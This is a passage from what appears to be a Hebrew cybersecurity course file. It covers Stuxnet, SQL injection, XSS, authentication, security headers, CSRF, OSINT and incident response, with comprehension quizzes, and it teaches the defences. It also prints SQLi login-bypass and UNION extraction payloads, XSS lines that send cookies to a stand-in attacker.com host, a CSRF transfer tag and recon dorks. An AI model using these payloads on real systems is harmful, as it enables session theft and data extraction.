<li><strong><code>HashiCorp Vault</code></strong> — <code>Dynamic secrets</code>, <code>Just-In-Time</code> credentials</li>
</ul>
</div>`
      },
      { type: "simulation", title: "הדמיית Firewall", simId: "firewall", content: "<p>שלחו חבילות לקיר האש וראו אילו חוקים חלים.</p>" },
      {
        type: "story",
        title: "הסיפור: Stuxnet — כשסייבר פגש צנטריפוגות גרעיניות",
        content: `<div dir="rtl">
<p><strong>Stuxnet 2010 — הנשק הסייברי הראשון בהיסטוריה</strong></p>
<p>2010: מומחי אבטחה גילו תולעת שלא דומה לשום דבר — <code>Stuxnet</code>.</p>
<ul>
<li>מאות קילובייטים של קוד</li>
<li>4 חולשות <code>zero-day</code> בו-זמנית</li>
<li>משימה ספציפית מאוד</li>
</ul>
<p><strong>המטרה:</strong> מתקן העשרת אורניום ב-Natanz, איראן.</p>
<p>הצנטריפוגות הונעו על ידי בקרים תעשייתיים — <code>PLCs</code> (<code>Programmable Logic Controllers</code>) של Siemens.</p>
<p><strong>האיך זה עבד:</strong></p>
<ol>
<li>Stuxnet הופץ דרך <code>USB drives</code> (הרשת הייתה <code>air-gapped</code>)</li>
<li>הגיע למחשבי <code>Windows</code> שמנהלים את ה-<code>PLCs</code></li>
<li>הסתיר את עצמו מ-<code>SCADA</code> monitoring — הציג ערכים "נורמליים"</li>
<li>שינה את מהירות הצנטריפוגות — פעם מהר מדי, פעם לאט מדי</li>
<li>כ-1,000 מתוך 5,000 הצנטריפוגות הושמדו</li>
</ol>
<p><strong>לקחים לאבטחת תשתיות <code>ICS</code>/<code>SCADA</code>:</strong></p>
<ul>
<li><code>Air Gap</code> לא מספיק — <code>USB</code> הוא וקטור תקיפה</li>
<li><code>OT</code>/<code>ICS networks</code> חייבים <code>Segmentation</code> מוחלט מ-<code>IT networks</code></li>
<li><code>PLCs</code> וציוד תעשייתי לא תוכננו עם security — הם vulnerable by design</li>
<li><code>Network Monitoring</code> ב-<code>ICS</code> חייב לכלול <code>anomaly detection</code></li>
<li><code>Defense in Depth</code>: <code>firewall</code>, <code>application whitelisting</code>, <code>patch management</code></li>
</ul>
<p><code>Stuxnet</code> הוכיח שקוד מחשב יכול לגרום לנזק פיזי ממשי.</p>
<p>האחריות מיוחסת לארה"ב וישראל.</p>
<p>מאז, מתקפות סייבר על תשתיות קריטיות כמו חשמל, מים וגז הפכו למציאות שגרתית.</p>
</div>`
      }
    ]
  },
  {
    id: 110,
    title: "SQL Injection ו-XSS — מעמיק",
    pages: [
      {
        type: "explanation",
        title: "SQL Injection — איך זה עובד",
        content: `<div dir="rtl">
<p><strong>SQL Injection — פגיעות מספר 1 ב-Web</strong></p>
<p><code>SQL Injection</code> מתרחשת כשהאפליקציה בונה שאילתת <code>SQL</code> ממחרוזת שמגיעה מהמשתמש, בלי לסנן אותה.</p>
<p>התוצאה: התוקף יכול לשנות את הלוגיקה של השאילתה ולבצע פעולות שלא תוכננו.</p>
<p><strong>דוגמה קלאסית — <code>Login Bypass</code></strong></p>
<div class="code-preview"><pre><code># קוד PHP פגיע
$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "' AND password='" . $_POST['pass'] . "'";

# קלט תוקף:
# username: admin'--
# password: anything

# שאילתה שנוצרת:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
# -- מבטל את שאר השאילתה → מחזיר admin ללא בדיקת סיסמה!</code></pre></div>
<p><strong>סוגי <code>SQL Injection</code></strong></p>
<table class="content-table">
  <tr><th>סוג</th><th>תיאור</th><th>דוגמה</th></tr>
  <tr><td><strong><code>Classic/In-band</code></strong></td><td>תוצאה חוזרת ישירות</td><td><code>UNION SELECT</code>, <code>Error-based</code></td></tr>
  <tr><td><strong><code>Blind Boolean</code></strong></td><td>שאלות כן/לא — אין <code>error</code></td><td><code>AND 1=1</code> vs <code>AND 1=2</code></td></tr>
  <tr><td><strong><code>Time-based Blind</code></strong></td><td>מדידת זמן תגובה</td><td><code>AND SLEEP(5)</code></td></tr>
  <tr><td><strong><code>Out-of-band</code></strong></td><td>נתונים לשרת חיצוני</td><td><code>DNS exfiltration</code></td></tr>
</table>
<p><strong><code>UNION-based Extraction</code></strong></p>
<div class="code-preview"><pre><code># שלב 1: גלה כמה עמודות יש
' ORDER BY 1-- → ok
' ORDER BY 2-- → ok
' ORDER BY 3-- → error → 2 עמודות

# שלב 2: גלה עמודות שמוצגות
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--  → אם 'a' מוצג → עמודה 1 visible

# שלב 3: שלוף נתונים
' UNION SELECT username,password FROM users--

# שלב 4: גלה database schema
' UNION SELECT table_name,NULL FROM information_schema.tables--</code></pre></div>
<p><strong>מניעה — <code>Prepared Statements</code></strong></p>
<div class="code-preview"><pre><code># Python - SQLite (פגיע)
cursor.execute(f"SELECT * FROM users WHERE name='{user_input}'")

# Python - SQLite (בטוח)
cursor.execute("SELECT * FROM users WHERE name=?", (user_input,))

# Java PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name=? AND pass=?"
);
ps.setString(1, username);
ps.setString(2, password);</code></pre></div>
<p><code>Prepared Statements</code> עובדים כי השאילתה מקומפלת לפני הכנסת הנתונים.</p>
<p>הנתונים מוכנסים כפרמטרים נפרדים — ולא יכולים לשנות את מבנה השאילתה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "XSS — Cross-Site Scripting",
        content: `<div dir="rtl">
<p><strong><code>XSS</code> — הזרקת <code>JavaScript</code> לדפדפן הקורבן</strong></p>
<p><code>XSS</code> מאפשרת לתוקף להריץ <code>JavaScript</code> בהקשר של האתר המותקף, בדפדפן של קורבן אחר.</p>
<p>ההבדל מ-<code>SQL Injection</code>: היעד הוא הדפדפן של המשתמש, לא מסד הנתונים.</p>
<p><strong>3 סוגי <code>XSS</code></strong></p>
<table class="content-table">
  <tr><th>סוג</th><th>מאפיין</th><th>כיצד עובד</th></tr>
  <tr><td><strong><code>Reflected</code></strong></td><td>לא נשמר</td><td><code>Payload</code> ב-<code>URL</code> → חוזר ישירות ב-<code>response</code></td></tr>
  <tr><td><strong><code>Stored/Persistent</code></strong></td><td>נשמר ב-<code>DB</code></td><td><code>Payload</code> נשמר → רץ על כל <code>visitor</code></td></tr>
  <tr><td><strong><code>DOM-based</code></strong></td><td>ב-<code>JavaScript</code></td><td><code>Payload</code> ב-<code>fragment/location</code> → <code>DOM manipulation</code></td></tr>
</table>
<p><strong><code>Payload</code> קלאסי — <code>Cookie Theft</code></strong></p>
<div class="code-preview"><pre><code># Reflected XSS — ב-URL
https://site.com/search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Stored XSS — בשדה תגובה
<script>
  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

# Event handler bypass (כשסינון מסיר script tags)
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<svg onload="alert(document.domain)">
<body onpageshow="alert(1)"></code></pre></div>
<p><strong>מניעה</strong></p>
<div class="code-preview"><pre><code># 1. HTML Encoding — מניע Reflected/Stored XSS
# במקום להציג: <script>
# מציגים:       &lt;script&gt;

# Python (Jinja2 — escape אוטומטי)
{{ user_input }}   # בטוח — escaped
{{ user_input | safe }}  # מסוכן — אל תשתמש!

# 2. Content Security Policy Header
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

# 3. HttpOnly Cookie — מונע גישת JS ל-cookie
Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Strict</code></pre></div>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — SQLi ו-XSS",
        titleEn: "SQLi & XSS — Comprehension Questions",
        questions: [
          { q: "מה ההבדל בין SQL Injection ל-XSS?", a: "הזרקת SQL תוקפת את מסד הנתונים בצד השרת, ואילו XSS תוקפת את הדפדפן של משתמש אחר ומריצה קוד בהקשר של האתר. בקצרה: הזרקת SQL פועלת בצד השרת, ו-XSS בצד הלקוח.", qEn: "What is the difference between SQL Injection and XSS?", aEn: "SQL Injection attacks the database on the server side. XSS attacks another user's browser and runs code in the context of the website. In short: SQL Injection works on the server, XSS works on the client." },
          { q: "מה Prepared Statements ולמה הם פותרים SQLi?", a: "שאילתות מוכנות (Prepared Statements) מקמפלות את שאילתת ה-SQL לפני הכנסת הנתונים. הנתונים מוכנסים כפרמטרים ולא כטקסט חופשי — כך הם לא יכולים לשנות את מבנה השאילתה.", qEn: "What are Prepared Statements and why do they prevent SQLi?", aEn: "Prepared Statements compile the SQL query before inserting the data. The data is inserted as parameters, not as free text — so it cannot change the structure of the query." },
          { q: "למה HttpOnly cookie מגן מ-XSS?", a: "עוגייה עם דגל HttpOnly לא נגישה לקוד JavaScript בדפדפן. גם אם יש פגיעות XSS באתר, התוקף לא יכול לגנוב את עוגיית ההפעלה (session cookie).", qEn: "Why does an HttpOnly cookie protect against XSS?", aEn: "A cookie with the HttpOnly flag is not accessible to JavaScript code in the browser. Even if the site has an XSS vulnerability, the attacker cannot steal the session cookie." },
          { q: "מה Time-based Blind SQLi?", a: "כאשר אין פלט גלוי מהשאילתה, התוקף שולח פקודת השהייה (למשל SLEEP) — אם השרת מגיב באיחור, הקוד רץ. כך אפשר לחלץ נתונים ביט-ביט לפי זמני תגובה.", qEn: "What is Time-based Blind SQLi?", aEn: "When there is no visible output from the query, the attacker sends a delay command (like SLEEP). If the server responds late, the code ran. This way you can extract data bit by bit based on response times." }
        ]
      }
    ]
  },
  {
    id: 111,
    title: "Authentication & Authorization",
    pages: [
      {
        type: "explanation",
        title: "Authentication vs Authorization",
        content: `<div dir="rtl">
<p><strong><code>Authentication</code> vs <code>Authorization</code></strong></p>
<p>שני מושגים יסודיים שמתבלבלים לעתים קרובות:</p>
<table class="content-table">
  <tr><th>מושג</th><th>שאלה</th><th>דוגמה</th></tr>
  <tr><td><strong><code>Authentication</code> (<code>AuthN</code>)</strong></td><td>מי אתה?</td><td><code>Login</code> עם <code>username</code>+<code>password</code></td></tr>
  <tr><td><strong><code>Authorization</code> (<code>AuthZ</code>)</strong></td><td>מה מותר לך?</td><td>רק <code>admin</code> יכול למחוק משתמשים</td></tr>
  <tr><td><strong><code>MFA</code></strong></td><td>הוכח עוד פעם</td><td><code>SMS OTP</code>, <code>TOTP</code>, <code>hardware key</code></td></tr>
</table>
<p><strong>שיטות <code>Authentication</code></strong></p>
<table class="content-table">
  <tr><th>שיטה</th><th>יתרון</th><th>חיסרון</th></tr>
  <tr><td><code>Password</code></td><td>פשוט</td><td>ניתן לגניבה, <code>brute-force</code></td></tr>
  <tr><td><code>TOTP</code> (<code>Google Auth</code>)</td><td><code>OTP</code> מתחלף</td><td>מחייב מכשיר</td></tr>
  <tr><td><code>WebAuthn</code>/<code>FIDO2</code></td><td><code>Phishing-resistant</code></td><td>מחייב <code>hardware key</code>/<code>biometric</code></td></tr>
  <tr><td><code>OAuth 2.0</code> / <code>OIDC</code></td><td><code>SSO</code>, לא שומר סיסמאות</td><td>מורכב</td></tr>
  <tr><td><code>Certificate</code> (<code>mTLS</code>)</td><td>חזק מאוד</td><td>ניהול <code>certificates</code></td></tr>
</table>
<p><strong><code>JWT</code> — <code>JSON Web Tokens</code></strong></p>
<div class="code-preview"><pre><code># מבנה JWT: header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xyz

# Header (base64):
{"alg": "HS256", "typ": "JWT"}

# Payload (base64):
{"user": "admin", "role": "user", "exp": 1700000000}

# Signature:
HMACSHA256(base64url(header) + "." + base64url(payload), secret)

# פגיעות: alg=none attack
# header שונה ל: {"alg": "none"}
# signature מוסר — שרת פגיע מקבל כל payload!
# תמיד לאמת: whitelist של algorithms (לא "none")</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "סיסמאות — Hashing נכון",
        content: `<div dir="rtl">
<p><strong>איך לאחסן סיסמאות בצורה בטוחה</strong></p>
<p>לעולם אל תאחסן סיסמאות בטקסט גלוי.</p>
<p>גם <code>hash</code> רגיל כמו <code>MD5</code> או <code>SHA1</code> לא מספיק — כלי פיצוח כמו <code>rainbow tables</code> ו-<code>GPU cracking</code> שוברים אותם תוך שניות.</p>
<p><strong><code>Password Hashing Functions</code></strong></p>
<table class="content-table">
  <tr><th>אלגוריתם</th><th>מה מוסיף</th><th>מומלץ?</th></tr>
  <tr><td><code>MD5</code> / <code>SHA1</code> / <code>SHA256</code></td><td>כלום — מהיר מדי</td><td>❌ לא לסיסמאות</td></tr>
  <tr><td><strong><code>bcrypt</code></strong></td><td><code>work factor</code> (<code>cost</code>), <code>salt</code> built-in</td><td>✅ כן</td></tr>
  <tr><td><strong><code>Argon2id</code></strong></td><td><code>memory-hard</code>, <code>time</code> + <code>memory cost</code></td><td>✅✅ הכי מומלץ</td></tr>
  <tr><td><strong><code>scrypt</code></strong></td><td><code>memory-hard</code></td><td>✅ כן</td></tr>
</table>
<div class="code-preview"><pre><code># Python — bcrypt
import bcrypt
# Hash סיסמה
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# אימות
if bcrypt.checkpw(password.encode(), hashed):
    print("Valid!")

# Python — Argon2 (הכי מומלץ)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)
hash = ph.hash(password)
ph.verify(hash, password)  # מחזיר True/False</code></pre></div>
<p><strong><code>Salt</code> — מה זה ולמה חשוב</strong></p>
<p><code>Salt</code> הוא ערך אקראי שמוסיפים לסיסמה לפני חישוב ה-<code>hash</code>.</p>
<p>כך שתי סיסמאות זהות מקבלות <code>hash</code> שונה — ו-<code>rainbow tables</code> הופכות לחסרות תועלת.</p>
<p><code>bcrypt</code> ו-<code>Argon2</code> מוסיפים <code>salt</code> באופן אוטומטי.</p>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — Auth",
        titleEn: "Authentication — Comprehension Questions",
        questions: [
          { q: "מה ההבדל בין Authentication ל-Authorization?", a: "אימות (Authentication) = מי אתה? הרשאה (Authorization) = מה מותר לך? כניסה למערכת היא אימות, ובדיקת הרשאות גישה לעמוד ניהול היא הרשאה.", qEn: "What is the difference between Authentication and Authorization?", aEn: "Authentication means 'who are you?' Authorization means 'what are you allowed to do?' Logging in is authentication. Checking if you can access the admin page is authorization." },
          { q: "למה bcrypt עדיף על SHA256 לסיסמאות?", a: "אלגוריתם bcrypt מכיל גורם עומס (work factor) מכוון שהופך אותו לאיטי בכוונה — ניסיון פריצה בכוח (brute-force) לוקח הרבה יותר זמן. בנוסף יש בו מלח (salt) מובנה. לעומתו SHA256 מהיר מדי — כרטיס מסך יכול לנסות מיליארדי ניחושים בשנייה.", qEn: "Why is bcrypt better than SHA256 for passwords?", aEn: "bcrypt has a work factor that makes it intentionally slow — brute-force attacks take much longer. It also has a built-in salt. SHA256 is too fast — a GPU can try billions of guesses per second." },
          { q: "מה JWT alg=none attack?", a: "טוקן JWT קובע את אלגוריתם החתימה בכותרת שלו. שרת פגיע שמקבל ערך none באלגוריתם מאמת טוקן ללא חתימה כלל — תוקף יכול לזייף כל תוכן (למשל להפוך את עצמו למנהל).", qEn: "What is the JWT alg=none attack?", aEn: "A JWT token sets its signing algorithm in the header. A vulnerable server that accepts 'none' as the algorithm verifies the token without any signature — an attacker can forge any content (for example, make themselves admin)." }
        ]
      }
    ]
  },
  {
    id: 112,
    title: "Web Security Headers",
    pages: [
      {
        type: "explanation",
        title: "HTTP Security Headers — שכבת הגנה קלה",
        content: `<div dir="rtl">
<p><strong><code>Security Headers</code> — ההגנה הנסתרת</strong></p>
<p><code>HTTP response headers</code> יכולים להנחות את הדפדפן לאכוף מדיניות אבטחה.</p>
<p>בעזרת כמה שורות קונפיגורציה, ניתן לחסום קטגוריות שלמות של מתקפות.</p>
<p><strong><code>Headers</code> חשובים</strong></p>
<table class="content-table">
  <tr><th>Header</th><th>מה עושה</th><th>ערך מומלץ</th></tr>
  <tr><td><strong><code>Content-Security-Policy</code></strong></td><td>מגביל מקורות <code>JS</code>, <code>CSS</code>, תמונות</td><td><code>default-src 'self'</code></td></tr>
  <tr><td><strong><code>Strict-Transport-Security</code></strong></td><td>כופה <code>HTTPS</code> (<code>HSTS</code>)</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
  <tr><td><strong><code>X-Frame-Options</code></strong></td><td>מונע <code>Clickjacking</code> (<code>iframes</code>)</td><td><code>DENY</code> או <code>SAMEORIGIN</code></td></tr>
  <tr><td><strong><code>X-Content-Type-Options</code></strong></td><td>מונע <code>MIME sniffing</code></td><td><code>nosniff</code></td></tr>
  <tr><td><strong><code>Referrer-Policy</code></strong></td><td>מגביל דליפת <code>URL</code> ב-<code>Referer</code></td><td><code>strict-origin-when-cross-origin</code></td></tr>
  <tr><td><strong><code>Permissions-Policy</code></strong></td><td>מגביל <code>APIs</code> (מיקום, מצלמה)</td><td><code>geolocation=(), camera=()</code></td></tr>
</table>
<p><strong><code>Content Security Policy</code> — דוגמאות</strong></p>
<div class="code-preview"><pre><code># בסיסי — רק מ-origin שלך
Content-Security-Policy: default-src 'self'

# עם CDN ו-Google Fonts
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  frame-ancestors 'none'

# Report-only mode — לא חוסם, רק מדווח
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report</code></pre></div>
<p><strong><code>HSTS</code> — <code>HTTP Strict Transport Security</code></strong></p>
<p><code>HSTS</code> אומר לדפדפן: לעולם אל תתחבר ב-<code>HTTP</code> — תמיד השתמש ב-<code>HTTPS</code>.</p>
<p>הדפדפן שומר הוראה זו למשך הזמן שמוגדר ב-<code>max-age</code>.</p>
<p>ההגדרה <code>preload</code> מאפשרת להכניס את הדומיין לרשימה מובנית בדפדפן — כך שגם הביקור הראשון יהיה מאובטח.</p>
<div class="code-preview"><pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "CSRF — Cross-Site Request Forgery",
        content: `<div dir="rtl">
<p><strong><code>CSRF</code> — גרימת בקשות ממקור זדוני</strong></p>
<p><code>CSRF</code> מנצלת את העובדה שהדפדפן שולח <code>cookies</code> אוטומטית עם כל בקשה.</p>
<p>אתר זדוני יכול לגרום לדפדפן של הקורבן לשלוח בקשה לאתר שבו הוא מחובר — והבקשה תישלח עם ה-<code>cookie</code> של אותו אתר.</p>
<div class="code-preview"><pre><code># תרחיש:
# 1. Alice מחוברת ל-bank.com (cookie session בדפדפן)
# 2. Alice ביקרה ב-evil.com
# 3. evil.com מכיל:
<img src="https://bank.com/transfer?to=attacker&amount=1000">
# הדפדפן שולח את ה-cookie של bank.com אוטומטית!

# פתרון: CSRF Token
# שרת מייצר token אקראי בכל form → שולח ב-hidden field
# בקשה ללא token תקני → נדחית

# Flask-WTF דוגמה:
<form method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>

# פתרון מודרני: SameSite Cookie
Set-Cookie: session=xyz; SameSite=Strict; Secure; HttpOnly
# SameSite=Strict → Cookie לא נשלח בבקשות cross-site בכלל
# SameSite=Lax → Cookie נשלח רק ב-navigation (לא POST)</code></pre></div>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — Web Security Headers",
        titleEn: "Web Security Headers — Comprehension Questions",
        questions: [
          { q: "מה Content-Security-Policy עושה?", a: "כותרת CSP מנחה את הדפדפן מאילו מקורות מותר לטעון סקריפטים, עיצוב, תמונות וכדומה. זה מגביל מתקפות XSS בכך שהדפדפן חוסם הרצת קוד משובץ בדף וקוד ממקורות לא מורשים.", qEn: "What does Content-Security-Policy do?", aEn: "The CSP header tells the browser which sources are allowed to load scripts, styles, images, etc. It limits XSS attacks by blocking inline code and code from unauthorized sources." },
          { q: "מה CSRF ואיך SameSite Cookie פותר אותו?", a: "זיוף בקשות (CSRF) גורם לדפדפן לשלוח בקשה לאתר מסוים בזמן שהמשתמש גולש באתר זדוני, תוך צירוף העוגיות אוטומטית. הגדרת עוגייה עם SameSite בערך Strict מונעת שליחת העוגייה בבקשות חוצות-אתר — כך הבקשה הזדונית נשלחת ללא הפעלה פעילה.", qEn: "What is CSRF and how does SameSite Cookie solve it?", aEn: "CSRF makes the browser send a request to a site while the user is on a malicious site, attaching cookies automatically. Setting a cookie with SameSite=Strict prevents the cookie from being sent in cross-site requests — so the malicious request is sent without an active session." },
          { q: "מה HSTS ולמה הוא מגן מ-SSL Stripping?", a: "כותרת HSTS אומרת לדפדפן להשתמש תמיד בחיבור מוצפן (HTTPS) לדומיין זה. מתקפת הורדת הצפנה (SSL Stripping) מנסה לשדרג לאחור לחיבור לא מוצפן. עם HSTS הדפדפן מסרב לחיבור לא מוצפן — כך המתקפה נכשלת.", qEn: "What is HSTS and why does it protect against SSL Stripping?", aEn: "The HSTS header tells the browser to always use HTTPS for this domain. SSL Stripping tries to downgrade to an unencrypted connection. With HSTS, the browser refuses unencrypted connections — so the attack fails." }
        ]
      }
    ]
  },
  {
    id: 113,
    title: "Threat Intelligence ו-OSINT",
    pages: [
      {
        type: "explanation",
        title: "Threat Intelligence — מה זה?",
        content: `<div dir="rtl">
<p><strong><code>Threat Intelligence</code> — מידע על איומים</strong></p>
<p><code>Threat Intelligence</code> (<code>TI</code>) הוא מידע על תוקפים, שיטות תקיפה, ומזהי פריצה (<code>IoCs</code> — Indicators of Compromise).</p>
<p>מידע זה מאפשר לארגון לעבור מתגובה פסיבית לגישה פרואקטיבית.</p>
<p><strong>סוגי <code>Threat Intelligence</code></strong></p>
<table class="content-table">
  <tr><th>סוג</th><th>מקורות</th><th>קהל יעד</th></tr>
  <tr><td><strong><code>Strategic</code></strong></td><td>דוחות, מגמות עולמיות</td><td><code>CISO</code>, <code>Management</code></td></tr>
  <tr><td><strong><code>Operational</code></strong></td><td><code>Campaign analysis</code>, <code>TTPs</code></td><td><code>Security managers</code></td></tr>
  <tr><td><strong><code>Tactical</code></strong></td><td><code>IoCs</code>: <code>IP</code>, <code>hash</code>, <code>domain</code></td><td><code>SOC analysts</code></td></tr>
  <tr><td><strong><code>Technical</code></strong></td><td><code>Malware samples</code>, <code>exploits</code></td><td><code>Threat hunters</code></td></tr>
</table>
<p><strong><code>IoC</code> — <code>Indicators of Compromise</code></strong></p>
<p><code>IoCs</code> הם עדויות שמצביעות על כך שמכשיר או רשת נפרצו:</p>
<ul>
<li><strong><code>IP addresses</code></strong> — כתובות שרתי <code>C2</code> (<code>Command & Control</code>)</li>
<li><strong><code>File hashes</code></strong> — <code>MD5</code>/<code>SHA256</code> של <code>malware</code> מוכר</li>
<li><strong><code>Domains</code></strong> — דומיינים זדוניים (<code>phishing</code>, <code>C2</code>)</li>
<li><strong><code>URLs</code></strong> — כתובות של <code>payload delivery</code></li>
<li><strong><code>Registry keys</code></strong> — <code>persistence mechanisms</code> ב-<code>Windows</code></li>
<li><strong><code>Mutexes</code></strong> — <code>malware</code> בודק אם כבר מותקן</li>
</ul>
<p><strong>מסגרת <code>MITRE ATT&CK</code></strong></p>
<p>מסגרת פתוחה שממפה את ה-<code>TTPs</code> (Tactics, Techniques, Procedures) של קבוצות <code>APT</code>.</p>
<p>14 שלבים: <code>Reconnaissance</code> &rarr; <code>Initial Access</code> &rarr; <code>Execution</code> &rarr; <code>Persistence</code> &rarr; ... &rarr; <code>Exfiltration</code> &rarr; <code>Impact</code>.</p>
<div class="code-preview"><pre><code># דוגמת TTP: T1566.001 — Spearphishing Attachment
# Tactic: Initial Access
# Technique: Phishing → Spearphishing Attachment
# Procedure: APT29 שולח PDF זדוני ל-targets ממוקדים
# Mitigation: M1049 — Antivirus/Antimalware, הכשרת עובדים</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "OSINT — Open Source Intelligence",
        content: `<div dir="rtl">
<p><strong><code>OSINT</code> — מודיעין ממקורות פתוחים</strong></p>
<p><code>OSINT</code> הוא איסוף מידע ממקורות ציבוריים וגלויים.</p>
<p>אנשי <code>Red Team</code> משתמשים בו ל-<code>Reconnaissance</code>.</p>
<p>אנשי <code>Blue Team</code> משתמשים בו כדי להבין מה תוקפים פוטנציאליים יכולים לגלות על הארגון.</p>
<p><strong>כלים ומקורות <code>OSINT</code></strong></p>
<table class="content-table">
  <tr><th>כלי</th><th>מה מוצא</th></tr>
  <tr><td><strong><code>Shodan</code></strong></td><td>מכשירי <code>IoT</code>, שרתים חשופים לאינטרנט עם <code>ports</code> פתוחים</td></tr>
  <tr><td><strong><code>Censys</code></strong></td><td>סריקה של כל ה-<code>IPv4</code> — <code>certificates</code>, <code>banners</code>, <code>services</code></td></tr>
  <tr><td><strong><code>theHarvester</code></strong></td><td><code>emails</code>, <code>subdomains</code>, <code>IPs</code> ממנועי חיפוש</td></tr>
  <tr><td><strong><code>Maltego</code></strong></td><td>גרף קשרים בין <code>domains</code>, <code>IPs</code>, <code>organizations</code></td></tr>
  <tr><td><strong><code>WHOIS</code> / <code>DNS</code></strong></td><td>רישום דומיין, <code>nameservers</code>, <code>MX records</code></td></tr>
  <tr><td><strong><code>Google Dorks</code></strong></td><td>site:, filetype:, inurl: לאיתור מידע רגיש</td></tr>
  <tr><td><strong><code>Have I Been Pwned</code></strong></td><td>האם <code>email</code> נחשף ב-<code>data breach</code></td></tr>
</table>
<div class="code-preview"><pre><code># Google Dorks — דוגמאות
site:target.com filetype:pdf              # קבצי PDF
site:target.com inurl:admin               # ממשקי ניהול
site:target.com intext:"password"         # קבצים עם "password"
"@target.com" site:linkedin.com           # עובדים ב-LinkedIn

# theHarvester
theHarvester -d target.com -b google,bing,linkedin -l 100

# Shodan דוגמה
hostname:target.com port:22               # SSH חשוף
org:"Target Company" product:"Apache"     # Apache servers</code></pre></div>
<p><strong><code>Passive</code> vs <code>Active Reconnaissance</code></strong></p>
<p><strong>Passive:</strong> לא שולחים תעבורה ישירה ליעד — <code>WHOIS</code>, <code>Shodan</code>, <code>Google</code>.</p>
<p><strong>Active:</strong> שולחים בקשות ישירות ליעד — <code>nmap</code>, <code>ping sweep</code>.</p>
<p><strong>חשוב:</strong> <code>Active Recon</code> עלולה להיות בלתי חוקית ללא אישור מפורש.</p>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — TI ו-OSINT",
        titleEn: "Threat Intelligence & OSINT — Comprehension Questions",
        questions: [
          { q: "מה IoC ותן 3 דוגמאות?", a: "מזהה פריצה (IoC) הוא עדות לכך שמערכת נפרצה. דוגמאות: כתובת IP של שרת שליטה ובקרה (C2), חתימת hash של קובץ נוזקה, ודומיין זדוני המשמש להתחזות (phishing).", qEn: "What is an IoC? Give 3 examples.", aEn: "An IoC (Indicator of Compromise) is evidence that a system was breached. Examples: IP address of a C2 (Command & Control) server, hash signature of a malware file, and a malicious domain used for phishing." },
          { q: "מה MITRE ATT&CK?", a: "מסגרת פתוחה הכוללת 14 טקטיקות (שלבי מתקפה) ומאות טכניקות. מאפשרת לסווג שיטות תקיפה (TTPs) של קבוצות תקיפה מתקדמות ולמפות מנגנוני הגנה מתאימים. משמשת גם לצוותי תקיפה וגם לצוותי הגנה.", qEn: "What is MITRE ATT&CK?", aEn: "An open framework with 14 tactics (attack stages) and hundreds of techniques. It allows classifying attack methods (TTPs) of advanced threat groups and mapping matching defenses. Used by both attack teams and defense teams." },
          { q: "מה ההבדל בין Passive ל-Active Reconnaissance?", a: "סיור פסיבי: איסוף מידע ממקורות ציבוריים (כמו Shodan, WHOIS, גוגל) — ללא תעבורה ישירה ליעד, לא ניתן לזהות את הסורק. סיור אקטיבי: שליחת בקשות ישירות ליעד (כמו nmap, ping) — ניתן לזהות, ועלול להיות בלתי חוקי ללא אישור.", qEn: "What is the difference between Passive and Active Reconnaissance?", aEn: "Passive recon: gathering info from public sources (Shodan, WHOIS, Google) — no direct traffic to the target, the scanner cannot be detected. Active recon: sending requests directly to the target (nmap, ping) — can be detected, and may be illegal without permission." }
        ]
      }
    ]
  },
  {
    id: 114,
    title: "Incident Response — תגובה לאירועים",
    pages: [
      {
        type: "explanation",
        title: "מחזור החיים של Incident Response",
        content: `<div dir="rtl">
<p><strong><code>Incident Response</code> (<code>IR</code>) — 6 שלבים</strong></p>
<p><code>IR</code> הוא תהליך מסודר לזיהוי, בלימה וסגירת אירועי אבטחה.</p>
<p>תקן <code>NIST SP 800-61</code> מגדיר 4 שלבים — בפועל משתמשים לרוב ב-6:</p>
<table class="content-table">
  <tr><th>שלב</th><th>פעולות</th></tr>
  <tr><td><strong>1. <code>Preparation</code></strong></td><td>בניית <code>IR team</code>, כלים, <code>runbooks</code>, תרגולים</td></tr>
  <tr><td><strong>2. <code>Identification</code></strong></td><td>זיהוי האירוע — <code>alert</code> מ-<code>SIEM</code>, <code>EDR</code>, <code>user report</code></td></tr>
  <tr><td><strong>3. <code>Containment</code></strong></td><td>בידוד מכשיר נגוע, חסימת <code>IP</code>, ניתוק מהרשת</td></tr>
  <tr><td><strong>4. <code>Eradication</code></strong></td><td>הסרת <code>malware</code>, <code>patch</code>, <code>reset credentials</code></td></tr>
  <tr><td><strong>5. <code>Recovery</code></strong></td><td>שחזור שירותים, <code>monitoring</code> מוגבר</td></tr>
  <tr><td><strong>6. <code>Lessons Learned</code></strong></td><td><code>Post-mortem</code>, עדכון כלים ו-<code>runbooks</code></td></tr>
</table>
<p><strong>כלי <code>Forensics</code> נפוצים</strong></p>
<div class="code-preview"><pre><code># Volatility — Memory Forensics
volatility -f memory.dmp --profile=Win10x64 pslist    # רשימת תהליכים
volatility -f memory.dmp --profile=Win10x64 netscan   # חיבורי רשת
volatility -f memory.dmp --profile=Win10x64 malfind   # תהליכים חשודים

# Linux — Incident Response commands
